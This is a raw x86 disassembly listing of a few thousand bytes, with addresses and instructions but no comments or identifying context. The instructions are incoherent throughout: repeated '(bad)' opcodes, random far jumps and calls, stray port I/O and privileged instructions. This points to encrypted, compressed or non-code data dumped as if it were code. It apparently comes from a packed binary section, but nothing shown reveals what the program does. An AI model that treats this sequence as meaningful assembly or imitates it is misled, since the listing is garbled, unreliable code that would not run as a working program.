  417d95:	lods   eax,DWORD PTR ds:[esi]
  417d96:	xor    eax,0x873749e0
  417d9b:	fisttp DWORD PTR [eax]
  417d9d:	fs push es
  417d9f:	and    ah,ch
  417da1:	shl    BYTE PTR [ecx-0x37aac454],1
  417da7:	ins    BYTE PTR es:[edi],dx
  417da8:	and    bl,bl
  417daa:	xchg   bl,bh
  417dac:	aad    0x3f
  417dae:	scas   al,BYTE PTR es:[edi]
  417daf:	sbb    edx,DWORD PTR [ecx-0x70]
  417db2:	and    ecx,DWORD PTR [ecx+0x5]
  417db5:	out    dx,eax
  417db6:	mov    ecx,0xfb6288e4
  417dbb:	das    
  417dbc:	push   esi
  417dbd:	push   esi
  417dbe:	into   
  417dbf:	mov    WORD PTR [ecx+0x29],ds
  417dc2:	data16 mov dh,0x61
  417dc5:	(bad)  
  417dc6:	mov    WORD PTR [edi-0x45c98d66],es
  417dcc:	mov    ds:0x197b54cd,al
  417dd1:	mov    dh,0x2f
  417dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dd4:	jns    0x417e1c
  417dd6:	cmp    esp,DWORD PTR [esp+ebp*1+0x7c935187]
  417ddd:	push   cs
  417dde:	mov    eax,0xf67ae0b9
  417de3:	mov    al,ds:0xa9962d36
  417de9:	sbb    dh,BYTE PTR [ebp+0xc0d3fbd]
  417def:	jae    0x417dc9
  417df1:	test   eax,0x41541784
  417df6:	jno    0x417e71
  417df8:	cmp    cl,BYTE PTR [eax]
  417dfa:	adc    DWORD PTR [edx-0x60],edx
  417dfd:	push   cs
  417dfe:	push   ss
  417dff:	jl     0x417e5b
  417e01:	pop    edi
  417e02:	int3   
  417e03:	mov    BYTE PTR [ebp+0x15],ch
  417e06:	jbe    0x417e48
  417e08:	test   BYTE PTR [esi],dl
  417e0a:	aaa    
  417e0b:	mov    ch,0x32
  417e0d:	xchg   DWORD PTR [esi],edi
  417e0f:	xchg   esp,eax
  417e10:	cld    
  417e11:	fnstsw ax
  417e13:	fucom  st(0)
  417e15:	scas   eax,DWORD PTR es:[edi]
  417e16:	jp     0x417db2
  417e18:	lods   al,BYTE PTR ds:[esi]
  417e19:	mov    ch,0x39
  417e1b:	(bad)  
  417e1c:	fild   DWORD PTR [ecx]
  417e1e:	in     al,0x22
  417e20:	mov    WORD PTR [ebp+0x16],ss
  417e23:	mov    ds:0xe7599de0,eax
  417e28:	mov    eax,ds:0x82418cfd
  417e2d:	push   eax
  417e2e:	ror    DWORD PTR ds:0xc22797f6,1
  417e34:	xor    dl,dh
  417e36:	ss xchg ecx,eax
  417e38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e39:	inc    esp
  417e3a:	imul   edx,DWORD PTR [esi-0x2546fdb2],0xffffffea
  417e41:	xchg   BYTE PTR [ebx+0x27],ch
  417e44:	mov    gs,WORD PTR [edi]
  417e46:	mov    bh,0xbf
  417e48:	mov    al,0xa3
  417e4a:	pop    ecx
  417e4b:	out    0xf7,eax
  417e4d:	retf   
  417e4e:	pushf  
  417e4f:	inc    eax
  417e50:	(bad)  
  417e51:	arpl   WORD PTR [esi-0x20799c20],dx
  417e57:	push   ebp
  417e58:	test   BYTE PTR [edi-0x42],dl
  417e5b:	mov    BYTE PTR [esi-0x28e81677],0x51
  417e62:	push   ebx
  417e63:	iret   
  417e64:	sbb    eax,0x9958fc53
  417e69:	xor    al,BYTE PTR [ebx]
  417e6b:	xchg   esp,eax
  417e6c:	sub    esi,DWORD PTR [ebp+0x14]
  417e6f:	jge    0x417ed1
  417e71:	sbb    al,0xa5
  417e73:	into   
  417e74:	in     al,0x90
  417e76:	adc    DWORD PTR [eax+0x2cd12306],esp
  417e7c:	clc    
  417e7d:	es push edx
  417e7f:	dec    ebx
  417e80:	and    al,0xaa
  417e82:	pushf  
  417e83:	mov    dh,0x21
  417e85:	mov    BYTE PTR [esi+0x58fa9cc3],ch
  417e8b:	and    DWORD PTR ds:0x7e12b9a4,edx
  417e91:	dec    ebp
  417e92:	(bad)  
  417e93:	mov    dh,0xe7
  417e95:	push   ebp
  417e96:	dec    edi
  417e97:	add    esi,0xffffffdc
  417e9a:	icebp  
  417e9b:	aad    0xdd
  417e9d:	sar    BYTE PTR [esp+0x5b48a0a0],cl
  417ea4:	sahf   
  417ea5:	or     ebx,DWORD PTR [eax]
  417ea7:	push   ds
  417ea8:	or     eax,0xe4919906
  417ead:	mov    ebp,0x2ae49fd4
  417eb2:	sub    ebx,DWORD PTR [edi-0xb4291eb]
  417eb8:	call   0x15a8:0xb4548c53
  417ebf:	jecxz  0x417e68
  417ec1:	mov    ds:0x391231ba,al
  417ec6:	cmp    al,0xbf
  417ec8:	rcr    BYTE PTR [ebx],0x52
  417ecb:	dec    ecx
  417ecc:	dec    edi
  417ecd:	and    eax,0xc5af22f8
  417ed2:	xlat   BYTE PTR ds:[ebx]
  417ed3:	les    edx,FWORD PTR [ecx+ecx*2+0x24]
  417ed7:	cdq    
  417ed8:	push   edi
  417ed9:	xor    DWORD PTR [ecx-0x3c4bb05e],eax
  417edf:	aas    
  417ee0:	dec    esp
  417ee1:	out    dx,eax
  417ee2:	es in  al,0x44
  417ee5:	mov    ch,0x61
  417ee7:	push   0x75d2a09f
  417eec:	jg     0x417f07
  417eee:	ja     0x417eed
  417ef0:	sub    bl,BYTE PTR [esi]
  417ef2:	jno    0x417f17
  417ef4:	(bad)  
  417ef5:	mov    eax,0x49d71109
  417efa:	ds out dx,eax
  417efc:	imul   eax,edx,0x7e
  417eff:	sbb    eax,0xecccf27
  417f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f05:	adc    eax,0x4e47a5f
  417f0a:	or     eax,0xad5514d0
  417f0f:	repz loope 0x417f82
  417f12:	outs   dx,DWORD PTR ds:[esi]
  417f13:	inc    eax
  417f14:	pop    ss
  417f15:	cld    
  417f16:	enter  0xd3a,0xd2
  417f1a:	js     0x417f64
  417f1c:	(bad)  
  417f1d:	out    dx,eax
  417f1e:	out    dx,eax
  417f1f:	jmp    0xe17d:0xe0e8565a
  417f26:	sub    al,0x43
  417f28:	fidivr WORD PTR [ebp-0x71]
  417f2b:	pop    edi
  417f2c:	nop
  417f2d:	xor    eax,0xd6bbb2ae
  417f32:	jecxz  0x417ed3
  417f34:	and    DWORD PTR [esi],0x2e3989b6
  417f3a:	sub    eax,0xb82bb0a7
  417f3f:	adc    eax,0x4a3ceafc
  417f44:	fwait
  417f45:	push   edx
  417f46:	add    DWORD PTR [esi+0x4e],ecx
  417f49:	fcomp  QWORD PTR [eax+0x24]
  417f4c:	xchg   edi,eax
  417f4d:	(bad)  [ebp+0x7c]
  417f50:	in     al,0xbe
  417f52:	jecxz  0x417ed4
  417f54:	stc    
  417f55:	repz cmp ebp,DWORD PTR [edx-0x12]
  417f59:	adc    bh,BYTE PTR [esi-0x78b31086]
  417f5f:	ficom  DWORD PTR [ecx-0x44d9b589]
  417f65:	pop    edx
  417f66:	pop    ebx
  417f67:	sbb    eax,DWORD PTR [eax-0x1b]
  417f6a:	adc    ebp,0xffffffd7
  417f6d:	mov    bl,0x4c
  417f6f:	rcr    BYTE PTR [edx-0x2],cl
  417f72:	push   edi
  417f73:	sub    BYTE PTR [esi],dh
  417f75:	jae    0x417f13
  417f77:	xchg   ebx,eax
  417f78:	inc    edi
  417f79:	ror    DWORD PTR [esi],0xa8
  417f7c:	aaa    
  417f7d:	xor    ch,ch
  417f7f:	in     eax,dx
  417f80:	sahf   
  417f81:	in     eax,0x25
  417f83:	je     0x417fab
  417f85:	inc    ebp
  417f86:	inc    ecx
  417f87:	and    bl,BYTE PTR [esi+0x1d]
  417f8a:	cmp    bh,BYTE PTR [edi-0x7ff66417]
  417f90:	clc    
  417f91:	xor    bh,BYTE PTR [ecx*4+0x6fc55eae]
  417f98:	mov    dh,0x88
  417f9a:	call   0x3c1d:0xe74fcfa9
  417fa1:	jbe    0x418001
  417fa3:	fdiv   DWORD PTR [edx]
  417fa5:	scas   al,BYTE PTR es:[edi]
  417fa6:	adc    eax,DWORD PTR [edx-0x46]
  417fa9:	sahf   
  417faa:	and    eax,0x796d7a93
  417faf:	jmp    0x97d4:0x90911b66
  417fb6:	daa    
  417fb7:	pop    esi
  417fb8:	inc    ebp
  417fb9:	fsub   QWORD PTR [edx+0x25dd116d]
  417fbf:	cmp    al,0x8b
  417fc1:	cs pop esp
  417fc3:	cmp    cl,BYTE PTR [edi+0x61]
  417fc6:	(bad)  
  417fc7:	hlt    
  417fc8:	jnp    0x417f81
  417fca:	es adc eax,esi
  417fcd:	lods   al,BYTE PTR ds:[esi]
  417fce:	and    DWORD PTR [esi],ebp
  417fd0:	out    0xf9,al
  417fd2:	aas    
  417fd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fd4:	sar    DWORD PTR [edi-0x7ceac04c],0x31
  417fdb:	add    dl,BYTE PTR [eax]
  417fdd:	inc    esi
  417fde:	maskmovq mm6,(bad)
  417fdf:	div    DWORD PTR [ebp-0x43e7ef28]
  417fe5:	jp     0x418048
  417fe7:	inc    ebp
  417fe8:	(bad)  
  417fea:	xor    eax,0xa4f0343f
  417fef:	push   edi
  417ff0:	mov    bl,0xea
  417ff2:	add    al,BYTE PTR [edx+0x48]
  417ff5:	inc    ebp
  417ff6:	in     al,dx
  417ff7:	or     al,0x9a
  417ff9:	retf   
  417ffa:	mov    ds:0x6a019669,eax
  417fff:	xchg   esp,eax
  418000:	mov    dl,0xe5
  418002:	ins    DWORD PTR es:[edi],dx
  418003:	icebp  
  418004:	inc    ebx
  418005:	mov    dh,0xe5
  418007:	jp     0x417fc6
  418009:	jo     0x41802d
  41800b:	push   ebp
  41800c:	outs   dx,BYTE PTR ds:[esi]
  41800d:	aad    0xbb
  41800f:	in     eax,dx
  418010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418011:	cli    
  418012:	jg     0x418009
  418014:	or     eax,0x42eab3b0
  418019:	loop   0x417fb9
  41801b:	cmp    BYTE PTR [esi+0x23],dh
  41801e:	and    al,0xbf
  418020:	jecxz  0x417fdf
  418022:	pop    ebp
  418023:	mov    fs,ecx
  418025:	or     ch,BYTE PTR ds:0x2486a4dc
  41802b:	stos   DWORD PTR es:[edi],eax
  41802c:	retf   
  41802d:	xchg   esi,eax
  41802e:	bound  ecx,QWORD PTR [ebx+0x32f42657]
  418034:	sbb    BYTE PTR [eax-0x12ef35f8],al
  41803a:	lea    ecx,[ecx+0x4f4acf18]
  418040:	arpl   sp,si
  418042:	jmp    0x4180b1
  418044:	inc    ebp
  418045:	(bad)  
  418046:	out    dx,al
  418047:	xchg   DWORD PTR ds:[ecx+0x730cd47a],edx
  41804e:	shr    BYTE PTR [edx+0x1c84d371],0x52
  418055:	fwait
  418056:	and    ch,ah
  418058:	or     DWORD PTR [edx-0x67],eax
  41805b:	cmp    eax,0x947e148d
  418060:	add    BYTE PTR [esi+0x6c],bh
  418063:	xchg   BYTE PTR [ebp+0x2b751854],dh
  418069:	cmc    
  41806a:	jno    0x4180a7
  41806c:	push   ds
  41806d:	add    bl,bl
  41806f:	mov    esp,DWORD PTR [edx+0x30]
  418072:	dec    edi
  418073:	mov    ch,0x1a
  418075:	jp     0x4180db
  418077:	pop    ds
  418078:	mov    ch,0x18
  41807a:	push   esp
  41807b:	fbstp  TBYTE PTR [ebx+edx*2-0x18cfc83]
  418082:	add    ebp,ebp
  418084:	test   eax,0xea8ea728
  418089:	out    dx,eax
  41808a:	jmp    0x70e83ed7
  41808f:	jne    0x4180a8
  418091:	test   eax,0xc70f840b
  418096:	push   ds
  418097:	add    ebp,DWORD PTR [edi-0x6c]
  41809a:	pop    ebx
  41809b:	push   edi
  41809c:	lods   eax,DWORD PTR ds:[esi]
  41809d:	adc    DWORD PTR [di+0x362e],eax
  4180a2:	jnp    0x4180b0
  4180a4:	or     eax,0x2a88d5ed
  4180a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180aa:	sbb    edi,DWORD PTR [edi+ecx*2+0x35]
  4180ae:	mov    ebx,0x934b1fbe
  4180b3:	push   es
  4180b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180b5:	pop    ds
  4180b6:	out    0x7,al
  4180b8:	out    0x79,eax
  4180ba:	cmp    al,0x22
  4180bc:	scas   eax,DWORD PTR es:[edi]
  4180bd:	in     eax,dx
  4180be:	aam    0x24
  4180c0:	mov    ds:0x54166c48,eax
  4180c5:	push   edi
  4180c6:	add    cl,BYTE PTR [ecx+0x15]
  4180c9:	fld    DWORD PTR [esi-0x68]
  4180cc:	sbb    al,0x6c
  4180ce:	in     eax,0xba
  4180d0:	iret   
  4180d1:	(bad)  
  4180d2:	sub    DWORD PTR [ebp-0x7a],esi
  4180d5:	jp     0x41814d
  4180d7:	sub    al,0x27
  4180d9:	and    cl,al
  4180db:	inc    ecx
  4180dc:	pop    ds
  4180dd:	jge    0x41813c
  4180df:	aas    
  4180e0:	stos   BYTE PTR es:[edi],al
  4180e1:	dec    esi
  4180e2:	mov    eax,ds:0x7abda044
  4180e7:	inc    eax
  4180e8:	jmp    0x8d68:0x15d9e68e
  4180ef:	push   sp
  4180f1:	add    DWORD PTR [esi+0x5e2f56a2],ebp
  4180f7:	mov    edx,0xe6f7845a
  4180fc:	xchg   ecx,eax
  4180fd:	dec    esi
  4180fe:	inc    ebp
  4180ff:	mov    eax,ds:0x77f662c4
  418104:	jae    0x4180e7
  418106:	xor    DWORD PTR [edi],0x20
  418109:	leave  
  41810a:	xlat   BYTE PTR ds:[ebx]
  41810b:	cli    
  41810c:	repz call 0xf147:0xea5f4822
  418114:	xchg   ebp,eax
  418115:	mov    esi,DWORD PTR [esi-0x6c]
  418118:	or     ebx,edx
  41811a:	ins    DWORD PTR es:[edi],dx
  41811b:	xchg   ebp,eax
  41811c:	xor    eax,0xbe467323
  418121:	xor    DWORD PTR [edi-0x3e],ebx
  418124:	and    DWORD PTR [esi+esi*1],0xd3b63397
  41812b:	ins    DWORD PTR es:[edi],dx
  41812c:	mov    cl,BYTE PTR [ebx]
  41812e:	ins    BYTE PTR es:[edi],dx
  41812f:	jne    0x4180fa
  418131:	mov    edi,0xb668f7b4
  418136:	popf   
  418137:	bound  edx,QWORD PTR [esi-0x242d08ad]
  41813d:	les    edx,FWORD PTR [esi+0x6ba74ff7]
  418143:	mov    dl,0x98
  418145:	mov    dl,0xde
  418147:	ins    BYTE PTR es:[edi],dx
  418148:	add    BYTE PTR [ebx-0xf747c4a],0x81
  41814f:	adc    al,0xf8
  418151:	arpl   sp,di
  418153:	outs   dx,BYTE PTR ds:[esi]
  418154:	mov    ?,WORD PTR [ebx-0x3c73da70]
  41815a:	inc    ebp
  41815b:	(bad)  
  41815c:	mov    ds:0x835467ee,eax
  418161:	fcomp  DWORD PTR [ebx+0x1f]
  418164:	xor    esi,DWORD PTR [eax-0x5723f87a]
  41816a:	cdq    
  41816b:	dec    esi
  41816c:	aad    0xbc
  41816e:	fnstcw WORD PTR [ebp-0x22fbd1c1]
  418174:	add    eax,0x8057fabb
  418179:	pop    edx
  41817a:	add    al,0x93
  41817c:	mov    esp,0x7746fbe2
  418181:	push   esp
  418182:	out    dx,eax
  418183:	inc    edx
  418184:	loope  0x4181bc
  418186:	inc    edx
  418187:	jecxz  0x418132
  418189:	mov    ds:0x6c772251,eax
  41818e:	fsubr  DWORD PTR [edi+0xd]
  418191:	out    0xd,eax
  418193:	xlat   BYTE PTR ds:[ebx]
  418194:	xchg   ecx,eax
  418195:	nop
  418196:	imul   ebx,DWORD PTR [edi-0x27508dc2],0xa10a97
  4181a0:	sti    
  4181a1:	xor    ecx,edi
  4181a3:	push   ecx
  4181a4:	mov    bh,0xda
  4181a6:	mov    esi,0x5fab40d
  4181ab:	pop    eax
  4181ac:	jge    0x41818d
  4181ae:	mov    ss,ebx
  4181b0:	sbb    eax,0x687b90a7
  4181b5:	jne    0x41814f
  4181b7:	ret    
  4181b8:	jo     0x418216
  4181ba:	out    0xa9,eax
  4181bc:	push   0xa95939da
  4181c1:	test   al,0x39
  4181c3:	clc    
  4181c4:	push   edx
  4181c5:	(bad)  
  4181c6:	(bad)  
  4181c7:	xchg   ebx,eax
  4181c8:	inc    esp
  4181c9:	loope  0x41821d
  4181cb:	mov    ebx,0x5c385670
  4181d0:	mov    edi,0x2438c02b
  4181d5:	(bad)  
  4181d7:	xchg   ebx,eax
  4181d8:	out    dx,al
  4181d9:	or     al,0x40
  4181db:	cmc    
  4181dc:	mov    bh,0xcf
  4181de:	fbstp  TBYTE PTR [eax-0x20]
  4181e1:	inc    eax
  4181e2:	sar    BYTE PTR [ebx],0xc
  4181e5:	pop    eax
  4181e6:	fst    DWORD PTR [ecx-0xa23162a]
  4181ec:	popf   
  4181ed:	mov    cl,0xde
  4181ef:	pop    ebp
  4181f0:	cs dec edi
  4181f2:	sub    ebx,DWORD PTR [ebx]
  4181f4:	in     eax,dx
  4181f5:	xchg   edi,eax
  4181f6:	push   esp
  4181f7:	loope  0x41821c
  4181f9:	or     cl,BYTE PTR [edx]
  4181fb:	add    eax,0xbcfef203
  418200:	cmp    esi,DWORD PTR [ecx+0x517544c2]
  418206:	mov    edi,0x20a82d48
  41820b:	mov    ecx,0x271c0be7
  418210:	ret    0x67c1
  418213:	push   esp
  418214:	out    0xc5,al
  418216:	fstp   QWORD PTR [edx+edi*8]
  418219:	add    esi,DWORD PTR [eax]
  41821b:	mov    al,ds:0xa9069ffd
  418220:	jg     0x41827d
  418222:	ins    BYTE PTR es:[edi],dx
  418223:	fidiv  DWORD PTR [edi+0x18]
  418226:	sbb    edi,ebx
  418228:	inc    ebp
  418229:	jbe    0x4181f6
  41822b:	xchg   esp,eax
  41822c:	adc    DWORD PTR [ebp+0x626eee60],ecx
  418232:	sub    edx,DWORD PTR [esi+ecx*2+0x36cc3d4c]
  418239:	lock jno 0x418248
  41823c:	xchg   esi,eax
  41823d:	push   cs
  41823e:	pop    ecx
  41823f:	fimul  WORD PTR [edx]
  418241:	dec    ebp
  418242:	jle    0x4182b4
  418244:	test   eax,edx
  418246:	(bad)  
  418247:	jno    0x418267
  418249:	js     0x418234
  41824b:	mov    dh,0x5f
  41824d:	pusha  
  41824e:	out    0xa3,eax
  418250:	bnd jp 0x418272
  418253:	aaa    
  418254:	inc    ebp
  418255:	mov    eax,esi
  418257:	sub    ah,BYTE PTR [ebx-0x6e]
  41825a:	in     eax,0xa4
  41825c:	das    
  41825d:	pushf  
  41825e:	loopne 0x4182ac
  418260:	xchg   BYTE PTR [eax+eiz*2-0x2d],bh
  418264:	int    0xfc
  418266:	and    eax,ecx
  418268:	mov    edx,esp
  41826a:	xor    esi,eax
  41826c:	mov    ecx,eax
  41826e:	mov    eax,0x336f3121
  418273:	fsub   QWORD PTR [eax-0x23]
  418276:	mov    ebp,0x768b986b
  41827b:	popf   
  41827c:	lods   eax,DWORD PTR ds:[esi]
  41827d:	daa    
  41827e:	sub    ecx,DWORD PTR [eax]
  418280:	popf   
  418281:	xor    dh,al
  418283:	inc    ebx
  418284:	pop    edi
  418285:	dec    esp
  418286:	jecxz  0x41827d
  418288:	inc    ebx
  418289:	ins    BYTE PTR es:[edi],dx
  41828a:	sar    BYTE PTR [esi],cl
  41828c:	sbb    ah,BYTE PTR cs:[edx-0x502ea339]
  418293:	mov    DWORD PTR [edx-0xa],edx
  418296:	jmp    0xef90556
  41829b:	repz jnp 0x41827e
  41829e:	push   ss
  41829f:	cmp    edi,edi
  4182a1:	inc    eax
  4182a2:	pop    ss
  4182a3:	jmp    0xdfd4:0x37336e3b
  4182aa:	shl    ah,0xbf
  4182ad:	xor    ebp,DWORD PTR [esi]
  4182af:	ja     0x4182e9
  4182b1:	call   0xf4a424a5
  4182b6:	fld    DWORD PTR [esi]
  4182b8:	xor    BYTE PTR [ebx-0x19],bl
  4182bb:	stos   DWORD PTR es:[edi],eax
  4182bc:	add    eax,0xe56f4eb3
  4182c1:	das    
  4182c2:	pop    ds
  4182c3:	inc    ecx
  4182c4:	clc    
  4182c5:	ret    0xeb12
  4182c8:	ffreep st(1)
  4182ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182cb:	push   edi
  4182cc:	jbe    0x4182a5
  4182ce:	ins    DWORD PTR es:[edi],dx
  4182cf:	adc    eax,0x76f40e67
  4182d4:	out    dx,eax
  4182d5:	inc    eax
  4182d6:	mov    bh,ch
  4182d8:	cmp    al,0x7a
  4182da:	cli    
  4182db:	bound  esp,QWORD PTR [ebx+edi*2+0x1c]
  4182df:	mov    dh,0x4e
  4182e1:	test   DWORD PTR [ebx+0x6148033f],ebx
  4182e7:	sub    eax,0x6ce47458
  4182ec:	xor    DWORD PTR [ecx+ebx*1],eax
  4182ef:	arpl   WORD PTR [esi],bp
  4182f1:	fdivr  QWORD PTR [edi-0x12371a12]
  4182f7:	push   ecx
  4182f8:	scas   eax,DWORD PTR es:[edi]
  4182f9:	push   ecx
  4182fa:	leave  
  4182fb:	xchg   edx,eax
  4182fc:	neg    ebx
  4182fe:	inc    esi
  4182ff:	mov    al,0x0
  418301:	imul   edx,ebp,0xc24d9558
  418307:	rcr    DWORD PTR [edi-0x59],1
  41830a:	icebp  
  41830b:	jne    0x41833d
  41830d:	ret    
  41830e:	test   al,0xfb
  418310:	clc    
  418311:	jnp    0x41835a
  418313:	fdivr  DWORD PTR [edi]
  418315:	mov    cl,0x7
  418317:	ins    BYTE PTR es:[edi],dx
  418318:	jmp    0x41838d
  41831a:	call   0xc0c3:0x161fa9e2
  418321:	cmp    al,0x6f
  418323:	mov    esi,0x16c4655
  418328:	aas    
  418329:	sbb    BYTE PTR [ebx],0x8f
  41832c:	outs   dx,BYTE PTR ds:[esi]
  41832d:	cmp    ecx,esp
  41832f:	sbb    ebx,DWORD PTR [edi]
  418331:	mov    dh,0x67
  418333:	aaa    
  418334:	mov    ?,WORD PTR [ecx+0x35d7a6a8]
  41833a:	add    esp,DWORD PTR [ebx]
  41833c:	mov    BYTE PTR [edx],cl
  41833e:	adc    BYTE PTR [ebx-0x6b6e837],dl
  418344:	pop    esp
  418345:	or     eax,0x2711f674
  41834a:	sub    esi,edx
  41834c:	jmp    0x418301
  41834e:	cmp    DWORD PTR [ebx],ebp
  418350:	ret    
  418351:	xchg   ebx,eax
  418352:	(bad)  
  418353:	pop    ds
  418354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418355:	mov    dh,0x6e
  418357:	aad    0x8
  418359:	pop    edi
  41835a:	cmp    esi,esi
  41835c:	mov    ecx,edi
  41835e:	jg     0x41836f
  418360:	ds stos DWORD PTR es:[edi],eax
  418362:	jbe    0x418376
  418364:	adc    esi,DWORD PTR [ecx]
  418366:	fisub  WORD PTR [edi-0x10]
  418369:	popa   
  41836a:	test   eax,0xcb9bd57b
  41836f:	inc    esi
  418370:	xor    ecx,ebp
  418372:	(bad)  
  418373:	das    
  418374:	mov    edi,esi
  418376:	pop    esp
  418377:	push   esp
  418378:	sub    esi,ecx
  41837a:	sahf   
  41837b:	mov    cl,0xb2
  41837d:	bound  esp,QWORD PTR [ebp+0x783225a7]
  418383:	popf   
  418384:	bound  edx,QWORD PTR [edx-0x5ee2b45f]
  41838a:	ins    BYTE PTR es:[edi],dx
  41838b:	xchg   ecx,eax
  41838c:	mov    ah,0x5e
  41838e:	sti    
  41838f:	out    0x2f,eax
  418391:	jns    0x41838b
  418393:	inc    edi
  418394:	lahf   
  418395:	(bad)  
  418396:	xchg   BYTE PTR [esi-0x15d6cfa7],al
  41839c:	add    BYTE PTR [ebp+esi*8+0x10],dl
  4183a0:	sahf   
  4183a1:	and    esp,ecx
  4183a3:	mov    al,0xab
  4183a5:	xchg   esi,eax
  4183a6:	sbb    ah,0x6
  4183a9:	push   edi
  4183aa:	push   esi
  4183ab:	or     al,ch
  4183ad:	or     ecx,ebp
  4183af:	rol    BYTE PTR [eax+0x77a7075d],0xb6
  4183b6:	jle    0x418429
  4183b8:	fsub   QWORD PTR [ebx+0x64]
  4183bb:	fbstp  TBYTE PTR [ecx]
  4183bd:	mov    al,ds:0x82a17146
  4183c2:	nop
  4183c3:	iret   
  4183c4:	jnp    0x4183b3
  4183c6:	nop
  4183c7:	push   0x6e5cad0c
  4183cc:	cmp    bl,ah
  4183ce:	daa    
  4183cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183d0:	loopne 0x418430
  4183d2:	or     BYTE PTR [ebp-0x7c],dh
  4183d5:	inc    ebp
  4183d6:	stos   DWORD PTR es:[edi],eax
  4183d7:	stos   DWORD PTR es:[edi],eax
  4183d8:	cwde   
  4183d9:	into   
  4183da:	xor    ebx,ebp
  4183dc:	and    DWORD PTR [esi+0x44],edi
  4183df:	or     al,0x5
  4183e1:	mov    dl,bh
  4183e3:	jae    0x4183ab
  4183e5:	mov    al,ds:0xfff140c0
  4183ea:	push   ds
  4183eb:	fidiv  WORD PTR [edi+0x7]
  4183ee:	and    al,0x6c
  4183f0:	gs (bad) 
  4183f4:	into   
  4183f5:	jp     0x418422
  4183f7:	dec    ecx
  4183f8:	jge    0x418389
  4183fa:	fmul   DWORD PTR [ecx-0x3e]
  4183fd:	sbb    eax,0xaa394f4
  418402:	mov    eax,ds:0x5234ca30
  418407:	cmc    
  418408:	mov    esi,0xbc3281b8
  41840d:	push   edi
  41840e:	cmp    DWORD PTR [ebx+0x3cba58fa],ecx
  418414:	and    DWORD PTR [edi+0x1a2c5248],edi
  41841a:	jg     0x418406
  41841c:	inc    ecx
  41841d:	jo     0x418467
  41841f:	lock pop ecx
  418421:	xchg   ecx,eax
  418422:	xor    BYTE PTR [ecx+esi*2-0x54],ah
  418426:	mov    ds:0xb21db1e2,al
  41842b:	fstp   DWORD PTR [eax-0x6]
  41842e:	mov    ecx,0x293e828a
  418433:	lds    esp,FWORD PTR [edi+0x56]
  418436:	lock sub eax,0x1efe0a1a
  41843c:	cmp    eax,0x73a634a9
  418441:	imul   ecx,edi,0xd625f350
  418447:	adc    eax,0x1ed8cd4c
  41844c:	mov    al,0xe8
  41844e:	ret    0x1667
  418451:	dec    esp
  418452:	jl     0x41843c
  418454:	pop    ebp
  418455:	and    esi,DWORD PTR [edi+0x21]
  418458:	fsub   QWORD PTR [edi]
  41845a:	(bad)  
  41845b:	popf   
  41845c:	lds    esi,FWORD PTR ss:[ebp-0x610f53b1]
  418463:	jge    0x418485
  418465:	jg     0x4184cf
  418467:	jmp    0x38cc:0xebcc639a
  41846e:	neg    DWORD PTR [edi-0x14549e30]
  418474:	sub    ah,0x42
  418477:	add    DWORD PTR [esi],ebx
  418479:	xlat   BYTE PTR ds:[ebx]
  41847a:	dec    ebp
  41847b:	pop    eax
  41847c:	inc    edi
  41847e:	xor    edx,DWORD PTR [ebp+eax*2-0x70]
  418482:	dec    edi
  418483:	lods   al,BYTE PTR es:[esi]
  418485:	push   0xe8889b13
  41848a:	imul   esp,eax,0xfffffff2
  41848d:	push   ss
  41848e:	cmp    bl,bl
  418490:	pop    ebx
  418491:	jl     0x41845b
  418493:	push   0xffffffe0
  418495:	ja     0x4184e6
  418497:	inc    ebp
  418498:	fstp   TBYTE PTR [eax]
  41849a:	push   ecx
  41849b:	inc    edi
  41849c:	arpl   WORD PTR [esi+ebx*4-0xadbf180],bx
  4184a3:	(bad)
  4184a6:	add    eax,0xbd4822fe
  4184ab:	les    edi,FWORD PTR [edi]
  4184ad:	mov    esi,0xd4c10ad
  4184b2:	sar    BYTE PTR [edi-0x7a64234b],cl
  4184b8:	mov    ebp,0x524efaa
  4184bd:	push   ebx
  4184be:	retf   0xd518
  4184c1:	push   ebp
  4184c2:	jns    0x418451
  4184c4:	sbb    eax,0x227c3e39
  4184c9:	gs add eax,edx
  4184cc:	inc    esi
  4184cd:	fwait
  4184ce:	adc    BYTE PTR ds:0x8d680e34,bh
  4184d4:	jg     0x41852f
  4184d6:	ret    0x238c
  4184d9:	adc    DWORD PTR [ecx+0x71068ecb],ebp
  4184df:	pop    esi
  4184e0:	xlat   BYTE PTR ds:[ebx]
  4184e1:	ror    BYTE PTR [edi],1
  4184e3:	les    esp,FWORD PTR [edx]
  4184e5:	add    DWORD PTR [ebp+0x7a],edx
  4184e8:	icebp  
  4184e9:	fidivr DWORD PTR [ebx]
  4184eb:	mov    esp,0x43a6c6f
  4184f0:	lea    esi,[ebp-0x60f598b]
  4184f6:	fisub  DWORD PTR [edx]
  4184f8:	jle    0x4184a5
  4184fa:	jns    0x418486
  4184fc:	push   esi
  4184fd:	mov    edx,0xa7688613
  418502:	ds cdq 
  418504:	push   eax
  418505:	sub    ecx,edi
  418507:	(bad)  
  418508:	sbb    cl,BYTE PTR [esi]
  41850a:	adc    BYTE PTR [esp+edx*4],al
  41850d:	rcr    DWORD PTR [edi-0x9],0x47
  418511:	jbe    0x4184f9
  418513:	mov    al,ds:0xc60bae84
  418518:	xchg   esi,eax
  418519:	mov    esi,0x8aed937c
  41851e:	inc    esi
  41851f:	jns    0x4184e3
  418521:	and    esi,ebx
  418523:	ja     0x4184ce
  418525:	jbe    0x41858d
  418527:	add    edi,edx
  418529:	xchg   ebp,eax
  41852a:	call   0x9a79c4c5
  41852f:	adc    bl,dl
  418531:	retf   
  418532:	mov    ecx,0xc3d78ba0
  418537:	xchg   esp,eax
  418538:	push   esi
  418539:	mov    al,ds:0xd106e396
  41853e:	call   0xe1b2:0x1a6941bb
  418545:	sub    eax,0xacdd46ed
  41854a:	jnp    0x418507
  41854c:	into   
  41854d:	sbb    ebx,DWORD PTR [ebx+0x1259a2eb]
  418553:	jge    0x41859d
  418555:	xor    al,0x62
  418557:	push   edi
  418558:	into   
  418559:	sbb    esi,DWORD PTR [edi+0x66]
  41855c:	cdq    
